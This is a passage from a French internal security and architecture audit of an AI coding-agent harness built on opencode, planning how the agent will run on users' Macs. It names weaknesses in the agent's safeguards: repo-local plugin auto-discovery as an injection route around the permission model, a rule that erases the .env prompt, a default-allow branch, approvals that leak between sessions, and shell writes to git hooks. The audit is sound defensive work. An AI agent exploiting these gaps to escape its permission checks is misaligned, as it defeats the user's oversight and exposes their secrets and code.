  tour n'est pas concernée (plomberie), mais rien d'autre ne doit commiter
  autrement. → [worktree-hooks.git.test.ts](../../lib/server/agent/worktree-hooks.git.test.ts)
- `sandbox-exec` sous `utilityProcess.fork` : **la mesure qui change la valeur de
  tout le reste** (§2). Toujours ouverte.
- La présence de `OPENROUTER_PROVISIONING_KEY` **en production** — si elle manque,
  le chemin local est mort-né.
- Les sites d'appel de `skill`, `lsp`, `doom_loop`, `plan_enter`/`plan_exit`.

---

## 10. Dettes de documentation créées par cet audit

Cinq commentaires-contrats du dépôt deviennent **faux** et doivent être corrigés
dans le lot qui les périme — c'est la classe d'erreur que ce dépôt combat partout
ailleurs :

| Fichier | Ce qui devient faux |
| --- | --- |
| [opencode-permissions.ts:24-27](../../lib/server/agent/vm/opencode-permissions.ts#L24-L27) | « `bash: "ask"` demande pour TOUTE commande » — faux de `cd`, `cd .`, `popd` |
| [opencode-permissions.ts:175-181](../../lib/server/agent/vm/opencode-permissions.ts#L175-L181) | « second rideau » — branche **jamais atteinte** |
| [opencode-config.ts:56-60](../../lib/server/agent/vm/opencode-config.ts#L56-L60) | « `tools:{x:false}` n'enlève pas le tool » — en 1.18.16 c'est le `deny` qui l'enlève |
| [opencode-config.ts:645](../../lib/server/agent/vm/opencode-config.ts#L645) | `OPENCODE_SHELL_CWD` n'existe pas dans le binaire |
| [network-policy.ts:10-11](../../lib/server/agent/network-policy.ts#L10-L11), [vm/main.ts:25-28](../../lib/server/agent/vm/main.ts#L25-L28) | « la machine qui exécute ne détient aucun secret » — cesse d'être vrai |

Et un manque de produit : **quand un run local rate vraiment** — avant que le
harness ait parlé (bundle qui ne se lance pas, opencode qui n'installe pas,
worktree impossible, TCC refusé, 403) — il n'existe **aucun log** : le `stdio`
d'`utilityProcess` n'est câblé nulle part, et les logs d'opencode partent dans un
dossier de la machine. C'est le premier ticket de support de la feature, et il
sera insoluble. → capture du stdout/stderr dès le lanceur, et un geste « copier le
rapport de diagnostic ».

> **FAIT (MIN-363, 2026-08-15) : cette dette est soldée.**
>
> - Les cinq commentaires ont été réécrits **là où ils sont lus** — les deux de
>   [opencode-permissions.ts](../../lib/server/agent/vm/opencode-permissions.ts)
>   (la mesure n°1, et le `case "external_directory"` qui est nommé branche morte
>   au lieu de « second rideau »), les trois de
>   [opencode-config.ts](../../lib/server/agent/vm/opencode-config.ts) : la
>   mesure n°4 dit maintenant qu'il y a **deux** catalogues, `list: "allow"` a
>   disparu (12 tools servis, pas de `list`), et `OPENCODE_SHELL_CWD` aussi (0
>   occurrence, revérifiée au `strings` sur `opencode-darwin-arm64`). Les deux
>   suppressions laissent derrière elles un commentaire qui dit **pourquoi la
>   ligne n'est pas là**, sans quoi la prochaine relecture la remettrait.
> - La ligne « la machine qui exécute ne détient aucun secret » était **déjà**
>   corrigée par MIN-355/357/360 aux trois endroits (`network-policy.ts`,
>   `vm/main.ts`, le bloc `apiKey` d'`opencode-config.ts`), comme le paragraphe
>   `read *.env ask` de [harness-opencode.md](../harness-opencode.md). Vérifié,
>   rien à réécrire.
> - **Le critère de bascule est réécrit** en tête du §4 de
>   [desktop-electron.md](../desktop-electron.md), avec ses quatre écarts assumés
>   et un renvoi vers D1/D2 pour les deux paragraphes que ces décisions périment.
> - **Les journaux existent avant le lanceur** :
>   [lib/desktop/run-log.ts](../../lib/desktop/run-log.ts) (nommage daté et
>   triable, rotation à deux plafonds qui garde toujours le plus récent,
>   substitution des secrets à l'écriture, forme du rapport) avec son test, et
>   [desktop/src/run-log.ts](../../desktop/src/run-log.ts) pour le `fs`. Le
>   lanceur de MIN-293 n'a qu'à brancher les deux flux de son `utilityProcess`
>   sur `openRunLog(...).write` — l'en-tête du fichier montre les cinq lignes. Le
>   geste **Help → Copy Diagnostic Report** est en place, et il ne fait que
>   remplir le presse-papier : rien ne part tout seul.

---

## 11. « Et si Numo n'était qu'un wrapper d'opencode ? »

Question posée après le premier audit. Quatorze agents : six inventaires du
partage délégué/forcé, quatre thèses de délégation, quatre contradicteurs.

### 11.1 Le partage aujourd'hui

**La grande délégation a déjà eu lieu**, et elle a coûté 18 100 lignes en moins
(`agent-loop.ts`, 2 305 l., et `subagent.ts`, 1 066 l., supprimés — cf.
[harness-opencode.md](../harness-opencode.md) §2.31). Sont déjà à opencode : la
boucle de rounds, l'appel modèle, le streaming, les retries, la compaction du
contexte, les tools de fichier et de shell, les sous-agents, le prompt système,
le critère de fin de tour (`session.idle`), et **l'historique de la conversation**
— le checkpoint de minddy part littéralement avec `messages: []`.

Ce que minddy garde se range en trois familles, et **elles ne se valent pas** :

| Famille | Exemples | Délégable ? |
| --- | --- | --- |
| **Produit** | le fil (`opencode-events.ts`, 768 l.), les ~37 tools de domaine, le ledger, la porte de livraison, le commit et la PR | Non. C'est minddy. |
| **Ce qu'opencode ne sait pas faire** | le ledger par round (opencode ne publie ni `generation_id` ni le coût facturé, et **ne facture rien d'un round avorté** alors que le fournisseur, lui, facture), le Stop et le steering, l'échéance de tour | Non. |
| **Mécanique d'hébergement** | l'export/rejeu du journal, le battement de cœur, le redémarrage du serveur à chaque tour | **Oui — et c'est la seule.** |

### 11.2 Les quatre thèses

| Thèse | Verdict | Ce que la contradiction en a laissé |
| --- | --- | --- |
| **Session vivante** — le serveur survit entre les tours | **la seule qui rende** | Le gain est réel mais **sur-compté** (voir 11.3) |
| **Permissions natives** — déléguer l'arbitrage aux règles d'opencode | **partiellement, et surtout pas pour la sécurité** | **Opencode n'a pas d'UI d'approbation : il n'a qu'un protocole.** Son écran, c'est son TUI, qu'on ne lance pas. La fenêtre d'approbation, **on l'écrit dans tous les cas.** Et ~536 des 1 140 lignes annoncées comme supprimables ne peuvent pas partir : `command-guard` est aussi appelé par `run_background` (un tool minddy qu'opencode ne voit jamais), `repo-path` par les mains du harness. |
| **Tools par MCP** — le pont local devient notre serveur MCP | **à ne pas faire** | **Le transport n'est pas l'arbitrage.** MIN-293 porte entièrement sur l'arbitrage des tools **intégrés** ; nos tools de domaine ne passent par **aucun** de ces mécanismes. Zéro ligne de `opencode-permissions.ts` ne bouge. Et ça rouvrirait MIN-326 (le verrou d'ancrage), casserait l'attribution (`run.created_by` → « <client> (mcp) »), et partagerait le plafond de 120 req/min avec le Claude Code de l'utilisateur. |
| **Lancer l'opencode de l'utilisateur** | **non** | On perdrait le **ledger** (notre provider déclare `cost` modèle par modèle ; un modèle déclaré sans `cost` fait rendre `cost: 0`), la **version épinglée** — or [harness-opencode.md](../harness-opencode.md) est un carnet de mesures **sur ce binaire**, pas sur une API publique — et le contrôle de ce qu'opencode lit. |

### 11.3 Le gain réel, une fois la contradiction passée

La thèse annonçait **~1 700 lignes** supprimées. **Le contradicteur a raison de
la rabattre**, et pour la raison exacte que le PO redoutait — *du travail déplacé
compté comme du travail supprimé* :

- **`drain.ts` (456 l.), `network-policy.ts` (270 l.), l'adaptateur sandbox : ne
  disparaissent pas.** Le §7 de cet audit pose un invariant — un run d'ancrage
  `pr`, de webhook, de routine, de chaîne ou de board public **ne part jamais en
  local**, et le BYOK non plus. **Le chemin cloud ne meurt pas.** Ces fichiers
  deviennent une branche sur deux, pas du code mort.
- **Les comptages sont gonflés** : les plages citées pour le journal donnent
  **83 lignes**, pas « ~180 » ; `appendRunJournal` + `loadRunJournal` font **49
  lignes**, pas « ~130 ».
- **`opencode-host.ts` ne disparaît pas** : il change de propriétaire et de
  fréquence (une opération d'installation de l'app au lieu d'un coût par tour).
  Et son comportement actuel — l'enfant meurt avec nous — **est un invariant
  écrit et motivé** (« pas de serveur orphelin entre deux tours »), pas un oubli.

**Ce qui reste, et qui est vrai :**

1. **L'export/rejeu du journal sort** — `syncJournal`, `syncHistory`/`syncReplay`,
   la table `agent_run_journal`, la route `POST /journal`, sa purge. Sa raison
   d'être est écrite dans le code : *« c'est ce qui rend un tour indépendant de la
   microVM qui l'a précédé »* ([supervisor.ts:506](../../lib/server/agent/vm/supervisor.ts#L506)).
   Vérifié par grep : cette table a **exactement un lecteur** dans tout le dépôt.
   **Et c'est une décision de confidentialité avant d'être une économie de code** :
   c'est elle qui ferait monter le contenu de fichiers personnels dans la base de
   prod (§6).
2. **`ask_user` cesse d'être terminal.** Aujourd'hui minddy `reject`e la question
   et **coupe le tour**, la réponse revenant au tour suivant par le steering. Le
   commentaire dit pourquoi : *« tenir une microVM ouverte le temps qu'un humain
   revienne coûterait des heures de compute »*. **Ce motif tombe sur le Mac.**
   `POST /question/:id/reply` bloque sans timeout et ne termine pas le tour. On
   supprime le détour le plus tordu du harness — une réponse d'humain qui revient
   déguisée en message de steering.
3. **Le « toujours » cesse de valoir un tour** (mesure n°8) — mais voir 11.4.
4. **Le callId mort** (mesure n°5) cesse d'être l'ordinaire : le problème n'existe
   que parce qu'on tue le process. Il reste sur ⌘Q et sur un crash.

### 11.4 Ce qui EMPIRE si la session survit

- **Le `always` fuit entre sessions** (mesuré). Aujourd'hui, le redémarrage du
  serveur à chaque tour est ce qui **contient** la fuite. Un serveur qui vit
  longtemps, c'est un « oui » donné sur le ticket A qui s'applique au ticket B.
  **La thèse supprime un garde-fou accidentel sans le remplacer.**
- Et le grain ne change pas : `always` sur `edit` porte `*`, `*` traverse les `/`,
  un `always` humain écrase un `deny` de config. **Faire durer plus longtemps un
  mécanisme trop grossier, sur le disque de l'utilisateur, aggrave le problème.**
- **Le §5.7 devient immédiat** : `OPENCODE_PORT`, `OPENCODE_DB_PATH`, les XDG sont
  des constantes globales. Un serveur unique tenu par l'app, c'est **une seule
  base SQLite pour tous les tickets**.

Le vrai remède au « toujours » n'est donc pas la survie du serveur : c'est le
**ruleset par session** (`POST /session {permission: […]}`), qui transforme un oui
humain en règle durable à un grain qu'on choisit. Mesuré depuis : un ruleset en
`allow` **n'ampute pas** le catalogue (contrairement au `deny`), et une règle de
motif en `deny` n'ampute pas non plus — `disabled` ne coupe que si la dernière
règle qui matche a `pattern === "*"`. **Mais** notre client ne connaît que
`createSession(title?)` : une règle posée à la **création** ne peut pas exprimer
un « Toujours » cliqué **en cours de tour**. La route de mise à jour reste à
vérifier.

### 11.5 Deux correctifs qui ne dépendent d'aucune de ces thèses

**`read: "allow"` neutralise une protection livrée par opencode.** Le ruleset par
défaut du binaire porte `read: {"*":"allow", "*.env":"ask", "*.env.*":"ask",
"*.env.example":"allow"}`. Nos règles étant concaténées **après** et le dernier
match gagnant, notre `read: "allow"` **efface la question sur les `.env`**. Sans
conséquence dans une microVM jetable. **Grave sur le disque de l'utilisateur.**
Trois précisions qui changent le geste :

- il est écrit **deux fois** — [opencode-config.ts:328](../../lib/server/agent/vm/opencode-config.ts#L328)
  et **:530**, ce second littéral étant celui des sous-agents `explore`,
  c'est-à-dire précisément ceux dont le métier est de lire ;
- le retirer seul **ne gagne rien** : `read` remonterait alors à
  `decidePermission`, dont le `switch` ne connaît que `task`/`bash`/`edit`/
  `external_directory` — et tomberait sur `default: return ALLOW` ;
- le cadrage prévoit par ailleurs de **recopier les `.env` exprès** dans le
  worktree (§4.3). Les deux décisions doivent être prises ensemble.

**Opencode auto-découvre des plugins dans le dépôt.** Il charge tout `*.ts` sous
`.opencode/plugin(s)/` et remonte depuis le cwd chercher un `opencode.json` — et
minddy ne pose **aucune** des écoutilles qui le désactiveraient. Dans une microVM
jetable, c'est sans enjeu. **Sur un Mac, c'est de l'exécution de code arbitraire
depuis le contenu d'un dépôt**, donc un vecteur d'injection qui contourne
entièrement le modèle de permissions. À fermer avant tout run local.

### 11.6 Réponse au PO

*« Numo n'est-il pas déjà un wrapper d'opencode, et lâcher plus de terrain ne
simplifierait-il pas le local ? »*

Numo **est** déjà un wrapper — la grande délégation a eu lieu et a coûté 18 100
lignes. Ce qui reste autour n'est pas du gras : c'est le produit (le fil, les
tickets, le ledger, la PR) et ce qu'opencode ne sait pas faire (la facture, le
Stop, l'horloge). **Lâcher davantage ne réduit pas ce travail, ça le déplace.**

Ce qui simplifie le local, c'est **la fin d'une contrainte, pas un transfert de
responsabilité** : la microVM mourait à chaque tour, donc minddy reconstruisait
l'état. Sur un Mac, il n'y a plus rien à reconstruire.

**Et cette simplification ne touche presque aucun des points durs du §2 au §7.**
Le mur de papier, la fatigue d'approbation, la cascade de refus, l'ordre des
règles, les trois verrous, le chien de garde, TCC, le scan de secrets : intacts.
**La délégation est une bonne économie de code, pas une réponse au chantier.**

---

## 12. Décisions du product owner (2026-08-14)

Quatre décisions prises après lecture de cet audit. Elles **réduisent fortement**
le périmètre — la moitié des points durs des §2 et §3 sortent de la v1.

### D1. L'environnement se choisit au début et ne change plus

Sélecteur cloud/local sur la page de l'agent, **au début d'une conversation**,
figé ensuite — comme `agent_runs.agent_engine`, et pour la même raison écrite
(« chaque moteur relit SA mémoire dans le checkpoint »).

**Conséquence directe : le repli cloud en cours de conversation du §4.5 du
cadrage n'existe pas.** Un repli ne peut avoir lieu qu'**avant le premier tour**.
Ça retire du dossier la bascule à chaud, son rejeu de journal et sa contradiction
avec la doctrine du moteur.

### D2. Par défaut, l'agent travaille dans le dépôt courant ; le worktree dédié est une option

Renverse le §4.3 du cadrage et la recommandation du §4 de cet audit. Motif
produit : c'est ce que fait Claude Code — session dans le checkout courant par
défaut, worktree dédié sur demande.

**Ce que ça supprime**, et c'est substantiel : la gestion des worktrees, le
réglage explicite de recopie des `.env` (ils sont déjà là), le coût
d'installation du premier tour, le nettoyage et la purge, l'accumulation des
snapshots `opencode/repos/`. **Tout le §4.3 du cadrage s'évapore.**

**Ce que ça oblige**, en revanche, et qui n'est pas optionnel : la chaîne de fin
de tour ne peut pas rester ce qu'elle est. Trois gestes détruisent du travail
humain dans un checkout partagé :

| Geste | Ancrage | Ce qu'il fait au checkout de l'humain |
| --- | --- | --- |
| `git add -A` | [repo-host.ts:334](../../lib/server/agent/repo-host.ts#L334) | Stage **tout** le non-ignoré : le WIP de l'humain part dans la PR |
| `git checkout -b` | [repo-host.ts:169](../../lib/server/agent/repo-host.ts#L169) | Change sa branche sous ses doigts |
| `git config user.email/user.name` | [repo-host.ts:163-164](../../lib/server/agent/repo-host.ts#L163-L164), :248-249 | Réécrit **son** identité git dans **son** dépôt (mesuré) |

Le troisième se règle en une passe : identité **par commande** (`git -c
user.email=…`), jamais persistée. Les deux premiers imposent de trancher le
livrable — voir D2bis.

**Deux garde-fous perdent leur sens** et il faut le dire : le worktree était
présenté comme la frontière qui empêche l'agent de marcher sur l'humain. En mode
courant, cette frontière n'existe plus du tout. Et deux trous du §4 deviennent
directs au lieu d'exiger un `git -C` : écrire dans `.git/hooks/` par le shell, et
`git config core.hooksPath`. **Ils passent de « majeur » à « bloquant v1 ».**

### D2bis. Ce qui reste à trancher : le livrable en mode courant

Trois formes, à choisir avant le lot de livraison.

- **A — Staging sélectif, branche non changée.** `git add -- <chemins de l'agent>`
  au lieu de `-A`. Minddy connaît déjà ces chemins (`delivery.noteEdit`). **Mais**
  la mesure n°7 devient critique : un « toujours » sur `edit` porte `*` et rend
  les éditions suivantes muettes — la liste serait alors **fausse**, pas seulement
  incomplète. Et elle ignore les fichiers créés par le shell (un `npm install` qui
  réécrit le lockfile, un codegen). *Repli impossible sur `git status` : il voit
  aussi le WIP de l'humain.*
- **B — Pas de commit du tout.** Le tour laisse les changements dans l'arbre de
  travail, le fil dit ce qui a bougé, l'humain relit dans son éditeur et commite.
  **C'est exactement le produit de Claude Code**, et c'est cohérent avec D2. Mais
  ce n'est plus « le produit est identique, seule la machine change » : la PR
  devient un geste explicite, pas la fin du tour.
- **C — Worktree dédié dès qu'une PR est demandée.** Le mode courant sert à
  itérer, le mode worktree à livrer. Le sélecteur porte alors deux choses.

### D3. V1 = le dossier du projet, rien d'autre

**L'accès au reste de l'ordinateur sort de la v1.** L'agent voit le dépôt local
attribué au projet, point.

**Ce qui sort du périmètre, et c'est l'essentiel du poids :**

- tout le §2 (le mur de papier) — `external_directory` reste en `deny` ;
- tout le §3 (approbations humaines) : le troisième verdict `ask`, le canal
  descendant, la table des demandes, le TTL, la cascade, les notifications
  actionnables, la fatigue, la portée d'un « oui », les grants durables ;
- les N racines, `denyRoots`, `readRoots`, la liste noire, le `realpath` ;
- `PermissionVerdict` garde `once | reject`, `decidePermission` ne bouge presque
  pas.

**Ce qui reste non négociable en v1**, parce que ça ne dépend pas de l'accès hors
dossier :

1. `default: return ALLOW` → `reject` sur le chemin local
   ([opencode-permissions.ts:183-185](../../lib/server/agent/vm/opencode-permissions.ts#L183-L185)).
2. **Fermer l'auto-découverte des plugins** `.opencode/plugin(s)/` (§11.5) — en
   mode dépôt courant, c'est de l'exécution de code arbitraire depuis le contenu
   d'un dépôt, sur la machine de l'utilisateur.
3. **`read: "allow"`** (§11.5) : en mode dépôt courant, le `.env` **réel** de
   l'utilisateur est là, et notre config efface la question qu'opencode posait.
   Ce qui était une décision v2 devient une décision v1.
4. La garde de chemin **normalisée** du proxy LLM, le mint obligatoire, le refus
   BYOK en local (§4, verrou 2).
5. `git config core.hooksPath` / `git -C` / écriture dans `.git/` par le shell.
6. Le chien de garde à 15 min, `sandboxMs` borné **côté serveur**, l'invariant
   « un run à contenu tiers ne part jamais en local » (§7).
7. Le scan de secrets avant push, et la décision sur `agent_run_journal` (§6).

### D4. Les autorisations de dossier macOS sont dans le périmètre

`~/Documents` et `~/Desktop` sont des emplacements courants pour un dépôt ; sans
traitement, l'accès est refusé **et la fenêtre de demande ne s'ouvre même pas**.

À faire : les `NS…UsageDescription` (Documents, Desktop, Downloads, volumes
amovibles) via `extendInfo` d'electron-builder — **en sachant que ça change
l'empreinte de republication**, donc republication + renotarisation.

**À mesurer avant, parce que ça pourrait être plus propre :** le geste
d'attachement du dossier au projet passe forcément par un `dialog.showOpenDialog`
(aujourd'hui jamais utilisé dans la coquille). Une sélection par panneau système
vaut consentement explicite et peut suffire à ouvrir le chemin sans invite TCC.
**Non vérifié**, et il y a une seconde inconnue qui compte davantage : le harness
est un process **enfant**, et opencode un petit-enfant. Il faut mesurer si le
droit descend jusqu'aux shells du modèle. C'est un argument de plus pour
`utilityProcess.fork` (enfant du bundle signé) contre un process détaché, qui
perd son processus responsable.
